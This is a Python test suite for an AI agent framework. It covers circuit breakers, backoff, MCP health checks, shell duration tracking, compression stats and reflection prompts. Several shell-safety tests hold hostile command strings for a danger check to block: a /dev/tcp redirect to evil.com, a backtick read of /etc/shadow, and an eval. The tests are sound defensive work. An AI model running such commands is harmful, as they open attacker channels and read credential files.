"""Tests for batch 4 improvements: circuit breaker, exponential backoff,
MCP health checks, shell duration tracking, compression stats, reflection quality.
"""

from __future__ import annotations

import json
import os
import subprocess
import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest


# ---------------------------------------------------------------------------
# 1. Circuit Breaker in BaseAgent
# ---------------------------------------------------------------------------

class TestCircuitBreaker:
    """Tests for the circuit breaker pattern in BaseAgent._execute_tool."""

    def _make_agent(self):
        from forge.agents.base import BaseAgent, AgentConfig
        from forge.agents.permissions import AutoApproveManager

        client = MagicMock()
        client.model = "test:7b"
        client.stats = MagicMock(total_calls=0, total_tokens=0, avg_time_s=0, errors=0)

        config = AgentConfig(name="test", tools=[])
        agent = BaseAgent(client=client, config=config, permissions=AutoApproveManager())
        return agent

    def test_circuit_breaker_initializes_empty(self):
        agent = self._make_agent()
        assert agent._tool_failure_counts == {}
        assert agent._tool_circuit_threshold == 3

    def test_successful_tool_resets_counter(self):
        agent = self._make_agent()
        # Simulate a tool that succeeds
        mock_tool = MagicMock()
        mock_tool.execute.return_value = "success"
        agent._function_tool_map["test_func"] = mock_tool

        # Set a failure count
        agent._tool_failure_counts["test_func"] = 2

        result = agent._execute_tool("test_func", {})
        assert result == "success"
        assert agent._tool_failure_counts["test_func"] == 0

    def test_failed_tool_increments_counter(self):
        agent = self._make_agent()
        mock_tool = MagicMock()
        mock_tool.execute.side_effect = RuntimeError("broken")
        agent._function_tool_map["test_func"] = mock_tool

        result = agent._execute_tool("test_func", {})
        assert "Tool error" in result
        assert agent._tool_failure_counts["test_func"] == 1

    def test_circuit_opens_after_threshold(self):
        agent = self._make_agent()
        mock_tool = MagicMock()
        mock_tool.execute.side_effect = RuntimeError("broken")
        agent._function_tool_map["test_func"] = mock_tool

        # Fail 3 times
        for i in range(3):
            agent._execute_tool("test_func", {})

        assert agent._tool_failure_counts["test_func"] == 3

        # Next call should be blocked by circuit breaker
        result = agent._execute_tool("test_func", {})
        assert "temporarily unavailable" in result
        assert "3 consecutive failures" in result
        # The tool should NOT have been called a 4th time
        assert mock_tool.execute.call_count == 3

    def test_circuit_breaker_per_function(self):
        agent = self._make_agent()

        # One tool broken, another working
        broken_tool = MagicMock()
        broken_tool.execute.side_effect = RuntimeError("broken")
        agent._function_tool_map["broken"] = broken_tool

        good_tool = MagicMock()
        good_tool.execute.return_value = "works"
        agent._function_tool_map["good"] = good_tool

        # Fail broken tool 3 times
        for _ in range(3):
            agent._execute_tool("broken", {})

        # broken tool should be blocked
        result = agent._execute_tool("broken", {})
        assert "temporarily unavailable" in result

        # good tool should still work
        result = agent._execute_tool("good", {})
        assert result == "works"

    def test_reset_circuit_breaker_single(self):
        agent = self._make_agent()
        agent._tool_failure_counts["test_func"] = 5
        agent._tool_failure_counts["other_func"] = 2

        agent.reset_circuit_breaker("test_func")
        assert "test_func" not in agent._tool_failure_counts
        assert agent._tool_failure_counts["other_func"] == 2

    def test_reset_circuit_breaker_all(self):
        agent = self._make_agent()
        agent._tool_failure_counts["a"] = 3
        agent._tool_failure_counts["b"] = 5

        agent.reset_circuit_breaker()
        assert agent._tool_failure_counts == {}

    def test_reset_circuit_breaker_nonexistent(self):
        agent = self._make_agent()
        # Should not raise
        agent.reset_circuit_breaker("nonexistent")


# ---------------------------------------------------------------------------
# 2. Exponential Backoff in OllamaClient
# ---------------------------------------------------------------------------

class TestExponentialBackoff:
    """Tests for exponential backoff in OllamaClient."""

    def test_backoff_delay_calculation(self):
        from forge.llm.client import OllamaClient
        # attempt 0: 1 * 2^0 = 1.0
        assert OllamaClient._backoff_delay(0) == 1.0
        # attempt 1: 1 * 2^1 = 2.0
        assert OllamaClient._backoff_delay(1) == 2.0
        # attempt 2: 1 * 2^2 = 4.0
        assert OllamaClient._backoff_delay(2) == 4.0
        # attempt 3: 1 * 2^3 = 8.0
        assert OllamaClient._backoff_delay(3) == 8.0

    def test_backoff_delay_max_cap(self):
        from forge.llm.client import OllamaClient
        # attempt 10: 1 * 2^10 = 1024, but capped at 10
        assert OllamaClient._backoff_delay(10) == 10.0

    def test_backoff_delay_custom_base(self):
        from forge.llm.client import OllamaClient
        assert OllamaClient._backoff_delay(0, base=2.0) == 2.0
        assert OllamaClient._backoff_delay(1, base=2.0) == 4.0

    def test_backoff_delay_custom_max(self):
        from forge.llm.client import OllamaClient
        assert OllamaClient._backoff_delay(5, max_delay=5.0) == 5.0

    def test_session_lifecycle_tracking(self):
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        assert hasattr(client, '_session_created')
        assert hasattr(client, '_session_max_age')
        assert client._session_max_age == 1800

    def test_get_session_returns_session(self):
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        session = client._get_session()
        import requests
        assert isinstance(session, requests.Session)

    def test_get_session_recreates_stale(self):
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        old_session = client._session
        # Force session to be stale
        client._session_created = time.time() - 3600  # 1 hour ago
        new_session = client._get_session()
        assert new_session is not old_session

    def test_get_session_keeps_fresh(self):
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        old_session = client._session
        new_session = client._get_session()
        assert new_session is old_session


# ---------------------------------------------------------------------------
# 3. Connect/Read Timeout Split
# ---------------------------------------------------------------------------

class TestTimeoutSplit:
    """Tests for connect/read timeout splitting in OllamaClient."""

    @patch("requests.Session.post")
    def test_generate_uses_tuple_timeout(self, mock_post):
        from forge.llm.client import OllamaClient
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "response": "test",
            "eval_count": 10,
            "prompt_eval_count": 5,
        }
        mock_post.return_value = mock_response

        client = OllamaClient()
        client.generate("hello", timeout=60)

        # Check the timeout parameter is a tuple (connect, read)
        call_args = mock_post.call_args
        assert call_args.kwargs.get("timeout") == (5, 60) or call_args[1].get("timeout") == (5, 60)

    @patch("requests.Session.post")
    def test_chat_uses_tuple_timeout(self, mock_post):
        from forge.llm.client import OllamaClient
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "message": {"content": "test", "role": "assistant"},
            "eval_count": 10,
            "prompt_eval_count": 5,
        }
        mock_post.return_value = mock_response

        client = OllamaClient()
        client.chat([{"role": "user", "content": "hello"}], timeout=120)

        call_args = mock_post.call_args
        assert call_args.kwargs.get("timeout") == (5, 120) or call_args[1].get("timeout") == (5, 120)


# ---------------------------------------------------------------------------
# 4. MCP Health Checks and Retry Logic
# ---------------------------------------------------------------------------

class TestMCPHealthChecks:
    """Tests for MCP health checks and install retry logic."""

    def _make_manager(self, tmp_path):
        from forge.mcp.manager import MCPManager
        config_path = tmp_path / "mcp.yaml"
        return MCPManager(config_path=str(config_path))

    def test_server_health_initialized(self, tmp_path):
        mgr = self._make_manager(tmp_path)
        assert mgr._server_health == {}

    def test_health_check_builtin(self, tmp_path):
        mgr = self._make_manager(tmp_path)
        results = mgr.health_check()
        # web-search is enabled by default and is builtin
        assert results.get("web-search") is True

    def test_health_check_updates_server_health(self, tmp_path):
        mgr = self._make_manager(tmp_path)
        results = mgr.health_check()
        assert mgr._server_health == results

    def test_check_mcp_binary_with_existing(self, tmp_path):
        from forge.mcp.manager import MCPManager
        from forge.mcp.registry import MCPEntry
        entry = MCPEntry(
            name="test", description="test", category="test",
            install_cmd="", package="json", builtin=False, config_example={},
        )
        # json is a stdlib module, always importable
        assert MCPManager._check_mcp_binary(entry) is True

    def test_check_mcp_binary_with_missing(self, tmp_path):
        from forge.mcp.manager import MCPManager
        from forge.mcp.registry import MCPEntry
        entry = MCPEntry(
            name="test", description="test", category="test",
            install_cmd="", package="nonexistent_package_xyz_999", builtin=False, config_example={},
        )
        assert MCPManager._check_mcp_binary(entry) is False

    def test_check_mcp_binary_no_package(self):
        from forge.mcp.manager import MCPManager
        from forge.mcp.registry import MCPEntry
        entry = MCPEntry(
            name="test", description="test", category="test",
            install_cmd="", package="", builtin=False, config_example={},
        )
        assert MCPManager._check_mcp_binary(entry) is True

    def test_save_config_atomic(self, tmp_path):
        """Verify _save_config writes atomically (no partial writes)."""
        mgr = self._make_manager(tmp_path)
        mgr._config["test-mcp"] = {"enabled": True, "key": "value"}
        mgr._save_config()

        # Config should be valid YAML
        import yaml
        with open(mgr.config_path) as f:
            data = yaml.safe_load(f)
        assert data["test-mcp"]["key"] == "value"

        # Temp file should not exist
        tmp_file = mgr.config_path.with_suffix(".yaml.tmp")
        assert not tmp_file.exists()

    @patch("subprocess.run")
    def test_install_retries_on_failure(self, mock_run, tmp_path):
        """Test that enable() retries installation on failure."""
        from forge.mcp.manager import MCPManager, MCP_INSTALL_MAX_RETRIES
        from forge.mcp.registry import MCP_REGISTRY, MCPEntry

        # Add a test entry to the registry
        test_entry = MCPEntry(
            name="test-retry", description="test", category="test",
            install_cmd="pip install test-pkg", package="test-pkg",
            builtin=False, config_example={},
        )
        MCP_REGISTRY["test-retry"] = test_entry

        try:
            # First 2 calls fail, 3rd succeeds
            mock_run.side_effect = [
                MagicMock(returncode=1, stderr="network error"),
                MagicMock(returncode=1, stderr="network error"),
                MagicMock(returncode=0, stdout="installed"),
            ]

            mgr = self._make_manager(tmp_path)
            with patch("time.sleep"):  # Don't actually sleep in tests
                result = mgr.enable("test-retry")

            assert "enabled successfully" in result
            assert mock_run.call_count == 3
        finally:
            MCP_REGISTRY.pop("test-retry", None)

    @patch("subprocess.run")
    def test_install_fails_after_max_retries(self, mock_run, tmp_path):
        """Test that enable() gives up after max retries."""
        from forge.mcp.manager import MCPManager, MCP_INSTALL_MAX_RETRIES
        from forge.mcp.registry import MCP_REGISTRY, MCPEntry

        test_entry = MCPEntry(
            name="test-fail", description="test", category="test",
            install_cmd="pip install bad-pkg", package="bad-pkg",
            builtin=False, config_example={},
        )
        MCP_REGISTRY["test-fail"] = test_entry

        try:
            mock_run.return_value = MagicMock(returncode=1, stderr="always fails")

            mgr = self._make_manager(tmp_path)
            with patch("time.sleep"):
                result = mgr.enable("test-fail")

            assert "Failed to install" in result
            assert f"{MCP_INSTALL_MAX_RETRIES} attempts" in result
        finally:
            MCP_REGISTRY.pop("test-fail", None)


# ---------------------------------------------------------------------------
# 5. Shell Command Duration Tracking
# ---------------------------------------------------------------------------

class TestShellDurationTracking:
    """Tests for shell command duration tracking and safety improvements."""

    def _make_shell(self, tmp_path):
        from forge.tools.shell import ShellTool
        return ShellTool(working_dir=str(tmp_path))

    def test_duration_tracking_initialized(self, tmp_path):
        shell = self._make_shell(tmp_path)
        assert shell._command_durations == []

    def test_duration_tracked_after_command(self, tmp_path):
        shell = self._make_shell(tmp_path)
        shell._run("echo hello")
        assert len(shell._command_durations) == 1
        cmd, duration = shell._command_durations[0]
        assert "echo hello" in cmd
        assert duration >= 0

    def test_duration_tracked_on_timeout(self, tmp_path):
        shell = self._make_shell(tmp_path)
        result = shell._run("sleep 10", timeout=1)
        assert "timed out" in result
        assert len(shell._command_durations) == 1

    def test_duration_tracked_on_error(self, tmp_path):
        shell = self._make_shell(tmp_path)
        # Command that will fail
        shell._run("false")
        assert len(shell._command_durations) == 1

    def test_get_duration_stats_empty(self, tmp_path):
        shell = self._make_shell(tmp_path)
        stats = shell.get_duration_stats()
        assert stats["total_commands"] == 0
        assert stats["total_time_s"] == 0

    def test_get_duration_stats_with_data(self, tmp_path):
        shell = self._make_shell(tmp_path)
        shell._run("echo a")
        shell._run("echo b")
        shell._run("echo c")

        stats = shell.get_duration_stats()
        assert stats["total_commands"] == 3
        assert stats["total_time_s"] >= 0
        assert stats["avg_time_s"] >= 0
        assert stats["max_time_s"] >= 0
        assert len(stats["recent"]) == 3

    def test_recent_caps_at_five(self, tmp_path):
        shell = self._make_shell(tmp_path)
        for i in range(10):
            shell._run(f"echo {i}")

        stats = shell.get_duration_stats()
        assert stats["total_commands"] == 10
        assert len(stats["recent"]) == 5

    def test_eval_blocked(self, tmp_path):
        shell = self._make_shell(tmp_path)
        assert shell._is_dangerous('eval "malicious code"')

    def test_exec_redirect_blocked(self, tmp_path):
        shell = self._make_shell(tmp_path)
        assert shell._is_dangerous("exec 3>/dev/tcp/evil.com/80")

    def test_backtick_injection_blocked(self, tmp_path):
        shell = self._make_shell(tmp_path)
        assert shell._is_dangerous("echo `cat /etc/shadow`")

    def test_safe_command_not_blocked(self, tmp_path):
        shell = self._make_shell(tmp_path)
        assert not shell._is_dangerous("ls -la")
        assert not shell._is_dangerous("git status")
        assert not shell._is_dangerous("python3 script.py")

    def test_output_truncation_preserves_limits(self, tmp_path):
        """Test that output truncation keeps within limits."""
        from forge.tools.shell import DEFAULT_MAX_OUTPUT
        assert DEFAULT_MAX_OUTPUT == 10000


# ---------------------------------------------------------------------------
# 6. Compression Stats Tracking
# ---------------------------------------------------------------------------

class TestCompressionStats:
    """Tests for compression statistics tracking in ContextCompressor."""

    def _make_compressor(self, strategy="truncate"):
        from forge.llm.context import ContextCompressor
        client = MagicMock()
        return ContextCompressor(
            client=client, max_tokens=100, strategy=strategy, keep_recent=3,
        )

    def test_stats_initialized(self):
        comp = self._make_compressor()
        assert comp._compression_stats["compressions"] == 0
        assert comp._compression_stats["total_input_tokens"] == 0
        assert comp._compression_stats["total_output_tokens"] == 0
        assert comp._compression_stats["extractive_fallbacks"] == 0

    def test_stats_updated_on_compression(self):
        comp = self._make_compressor(strategy="truncate")
        # Create messages that exceed max_tokens
        messages = [
            {"role": "user", "content": "x" * 500}
            for _ in range(10)
        ]
        comp.compress(messages)
        assert comp._compression_stats["compressions"] == 1
        assert comp._compression_stats["total_input_tokens"] > 0
        assert comp._compression_stats["total_output_tokens"] > 0

    def test_stats_not_updated_without_compression(self):
        comp = self._make_compressor()
        # Short messages - no compression needed
        messages = [{"role": "user", "content": "hi"}]
        comp.compress(messages)
        assert comp._compression_stats["compressions"] == 0

    def test_get_stats(self):
        comp = self._make_compressor(strategy="truncate")
        messages = [{"role": "user", "content": "x" * 500} for _ in range(10)]
        comp.compress(messages)

        stats = comp.get_stats()
        assert stats["compressions"] == 1
        assert "avg_compression_ratio" in stats
        assert stats["avg_compression_ratio"] < 1.0  # output should be smaller

    def test_get_stats_no_compressions(self):
        comp = self._make_compressor()
        stats = comp.get_stats()
        assert stats["avg_compression_ratio"] == 1.0

    def test_extractive_fallback_tracked(self):
        comp = self._make_compressor(strategy="sliding_summary")
        # Make LLM generate fail so extractive fallback is used
        comp.client.generate.side_effect = Exception("LLM unavailable")

        messages = [
            {"role": "user", "content": "x" * 500}
            for _ in range(10)
        ]
        comp.compress(messages)
        assert comp._compression_stats["extractive_fallbacks"] == 1

    def test_multiple_compressions_accumulate(self):
        comp = self._make_compressor(strategy="truncate")
        messages = [{"role": "user", "content": "x" * 500} for _ in range(10)]

        comp.compress(messages)
        comp.compress(messages)

        assert comp._compression_stats["compressions"] == 2


# ---------------------------------------------------------------------------
# 7. Reflection Quality Improvements
# ---------------------------------------------------------------------------

class TestReflectionQuality:
    """Tests for reflection quality improvements in ReflectiveAgent."""

    def test_select_review_prompt_code(self):
        from forge.agents.reflect import ReflectiveAgent
        agent = self._make_agent()
        prompt = agent._select_review_prompt("Here is the code:\n```python\ndef foo(): pass\n```")
        from forge.agents.reflect import REVIEW_PROMPT_CODE
        assert prompt == REVIEW_PROMPT_CODE

    def test_select_review_prompt_def(self):
        from forge.agents.reflect import ReflectiveAgent
        agent = self._make_agent()
        prompt = agent._select_review_prompt("def merge_sorted(a, b): return sorted(a + b)")
        from forge.agents.reflect import REVIEW_PROMPT_CODE
        assert prompt == REVIEW_PROMPT_CODE

    def test_select_review_prompt_short(self):
        from forge.agents.reflect import ReflectiveAgent
        agent = self._make_agent()
        prompt = agent._select_review_prompt("The answer is 42.")
        from forge.agents.reflect import REVIEW_PROMPT_SHORT
        assert prompt == REVIEW_PROMPT_SHORT

    def test_select_review_prompt_general(self):
        from forge.agents.reflect import ReflectiveAgent
        agent = self._make_agent()
        long_text = "This is a detailed explanation. " * 20
        prompt = agent._select_review_prompt(long_text)
        from forge.agents.reflect import REVIEW_PROMPT_GENERAL
        assert prompt == REVIEW_PROMPT_GENERAL

    def test_categorize_issues_factual(self):
        from forge.agents.reflect import ReflectiveAgent
        cats = ReflectiveAgent._categorize_issues("The statement is incorrect and factually wrong")
        assert "factual" in cats

    def test_categorize_issues_completeness(self):
        from forge.agents.reflect import ReflectiveAgent
        cats = ReflectiveAgent._categorize_issues("The answer is incomplete, missing key details")
        assert "completeness" in cats

    def test_categorize_issues_code_error(self):
        from forge.agents.reflect import ReflectiveAgent
        cats = ReflectiveAgent._categorize_issues("There is a syntax error in the code and a missing import")
        assert "code_error" in cats

    def test_categorize_issues_clarity(self):
        from forge.agents.reflect import ReflectiveAgent
        cats = ReflectiveAgent._categorize_issues("The explanation is unclear and hard to follow")
        assert "clarity" in cats

    def test_categorize_issues_general_fallback(self):
        from forge.agents.reflect import ReflectiveAgent
        cats = ReflectiveAgent._categorize_issues("Some improvement suggestions here")
        assert "general" in cats

    def test_categorize_issues_multiple(self):
        from forge.agents.reflect import ReflectiveAgent
        cats = ReflectiveAgent._categorize_issues(
            "The code has a bug and the explanation is incomplete"
        )
        assert "code_error" in cats
        assert "completeness" in cats

    def test_issue_categories_tracked(self):
        agent = self._make_agent()
        assert agent._issue_categories == {}

    def test_stats_include_issue_categories(self):
        agent = self._make_agent()
        agent._issue_categories["factual"] = 2
        agent._issue_categories["code_error"] = 1
        stats = agent.get_stats()
        assert "issue_categories" in stats["reflection"]
        assert stats["reflection"]["issue_categories"]["factual"] == 2

    def _make_agent(self):
        from forge.agents.reflect import ReflectiveAgent
        from forge.agents.base import AgentConfig
        from forge.agents.permissions import AutoApproveManager

        client = MagicMock()
        client.model = "test:7b"
        client.stats = MagicMock(total_calls=0, total_tokens=0, avg_time_s=0, errors=0)

        config = AgentConfig(name="test-reflect", tools=[])
        return ReflectiveAgent(
            client=client, config=config, permissions=AutoApproveManager(),
        )


# ---------------------------------------------------------------------------
# 8. Integration-style tests
# ---------------------------------------------------------------------------

class TestBatch4Integration:
    """Cross-cutting integration tests for batch 4 improvements."""

    def test_circuit_breaker_doesnt_affect_other_agents(self):
        """Two agents should have independent circuit breakers."""
        from forge.agents.base import BaseAgent, AgentConfig
        from forge.agents.permissions import AutoApproveManager

        client = MagicMock()
        client.model = "test:7b"
        client.stats = MagicMock(total_calls=0, total_tokens=0, avg_time_s=0, errors=0)

        agent1 = BaseAgent(client=client, config=AgentConfig(name="a1", tools=[]), permissions=AutoApproveManager())
        agent2 = BaseAgent(client=client, config=AgentConfig(name="a2", tools=[]), permissions=AutoApproveManager())

        agent1._tool_failure_counts["test_func"] = 5
        assert agent2._tool_failure_counts.get("test_func", 0) == 0

    def test_client_backoff_static_method(self):
        """_backoff_delay should be callable without instance."""
        from forge.llm.client import OllamaClient
        delay = OllamaClient._backoff_delay(2)
        assert delay == 4.0

    def test_shell_and_context_stats_independent(self, tmp_path):
        """Shell duration stats and compression stats are independent."""
        from forge.tools.shell import ShellTool
        from forge.llm.context import ContextCompressor

        shell = ShellTool(working_dir=str(tmp_path))
        comp = ContextCompressor(client=MagicMock(), max_tokens=100, strategy="truncate")

        shell._run("echo test")
        messages = [{"role": "user", "content": "x" * 500} for _ in range(10)]
        comp.compress(messages)

        assert shell.get_duration_stats()["total_commands"] == 1
        assert comp.get_stats()["compressions"] == 1
